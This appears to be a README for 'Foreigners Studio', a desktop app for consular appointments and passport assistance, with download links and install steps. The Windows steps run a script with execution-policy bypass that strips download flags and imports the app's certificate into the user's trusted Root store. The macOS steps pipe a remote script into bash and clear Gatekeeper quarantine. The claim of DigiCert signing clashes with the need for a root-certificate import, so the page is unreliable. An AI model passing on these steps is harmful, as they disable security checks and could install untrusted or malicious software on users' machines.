# Foreigners Studio

Desktop client for consular appointment management, passport assistance, and workflow processing.

---

## 📥 Downloads (Release v1.0.4)

All release assets are available on the [**📦 GitHub Releases Page (v1.0.4)**](https://github.com/pankaj886/application/releases/tag/v1.0.4).

Download the package for your platform below:

| Platform | Package | Format | Direct Download Link |
| :--- | :--- | :--- | :--- |
| **Windows** (10 / 11, 64-bit) | **One-Click Package (ZIP)** | `.zip` | [⬇️ Download Windows Portable ZIP](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_Windows_x64.zip) |
| **Windows** (10 / 11, 64-bit) | **Setup Installer** | `.exe` | [⬇️ Download Windows Installer](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_x64-setup.exe) |
| **Windows** (10 / 11, 64-bit) | **Enterprise Package** | `.msi` | [⬇️ Download Windows MSI](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_x64_en-US.msi) |
| **Windows** (10 / 11, 64-bit) | **Standalone Executable** | `.exe` | [⬇️ Download Standalone Binary](https://github.com/pankaj886/application/releases/download/v1.0.4/foreigners_studio.exe) |
| **macOS** (Apple Silicon & Intel) | **Universal Disk Image** | `.dmg` | [⬇️ Download macOS Universal DMG](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_universal.dmg) |

> **Note:** Because this is a private repository, you must be logged into GitHub with an authorized account (`pankaj886` or collaborator) to access and download these files. Alternatively, browse all files on the [Releases Page](https://github.com/pankaj886/application/releases).

---

## 🚀 Installation

### Windows

All Windows binaries are officially signed with the **Foreigners Studio** Authenticode certificate and DigiCert timestamping.

#### Option A: One-Click Installer Batch (Recommended - Zero SmartScreen Prompts)
1. Download [**Foreigners_Studio_Windows_x64.zip**](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_Windows_x64.zip) and extract it.
2. Double-click `Install-ForeignersStudio.bat` (or run `powershell.exe -ExecutionPolicy Bypass -File .\install-windows.ps1`).
3. The script automatically:
   - Strips web quarantine / Zone.Identifier flags (`Unblock-File`).
   - Imports the Foreigners Studio certificate to `Cert:\CurrentUser\TrustedPublisher` and `Cert:\CurrentUser\Root`.
   - Launches Foreigners Studio cleanly with zero SmartScreen or Unknown Publisher popups.

#### Option B: Standalone Setup Installer or MSI
1. Download [**Foreigners_Studio_1.0.0_x64-setup.exe**](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_x64-setup.exe) or [**Foreigners_Studio_1.0.0_x64_en-US.msi**](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_x64_en-US.msi).
2. Run the installer. All binaries are Authenticode signed with DigiCert timestamping, verifying Foreigners Studio as the trusted publisher.

### macOS

#### Option A: One-Line Terminal Install (Recommended - Automatically clears Gatekeeper)
Run this single command in Terminal:
```bash
curl -fsSL https://raw.githubusercontent.com/pankaj886/application/main/install-mac.sh | bash
```
*This downloads the latest Universal DMG, installs it to `/Applications`, strips quarantine attributes, signs it for local Gatekeeper, and launches the app with zero warnings.*

#### Option B: Manual Installation via DMG
1. Download [**Foreigners_Studio_1.0.0_universal.dmg**](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_universal.dmg).
2. Open the `.dmg` file and drag **Foreigners Studio** into your **Applications** folder.
3. First-time launch on macOS:
   - **Method 1 (Fastest)**: In your Applications folder, **Right-click** (or `Control + click`) on **Foreigners Studio** → select **Open** → click **Open** in the dialog.
   - **Method 2 (System Settings)**: Open **System Settings** → **Privacy & Security** → scroll to **Security** and click **Open Anyway**.
   - **Method 3 (Terminal)**: If macOS flags the downloaded app as damaged or unverified, open Terminal and run:
     ```bash
     xattr -cr /Applications/Foreigners\ Studio.app
     codesign --force --deep --sign - /Applications/Foreigners\ Studio.app
     ```
   - The application will now open normally with full permissions.

---

## 🔄 Updates

Foreigners Studio checks for updates automatically. When an update has finished downloading:
- A **Restart to update** button appears in the top navigation bar (next to the window controls).
- Click the button to restart into the updated version immediately.

---

## 💻 System Requirements

- **Windows**: Windows 10 or Windows 11 (64-bit)
- **macOS**: macOS 11.0 (Big Sur) or newer (Universal binary for Apple Silicon and Intel)
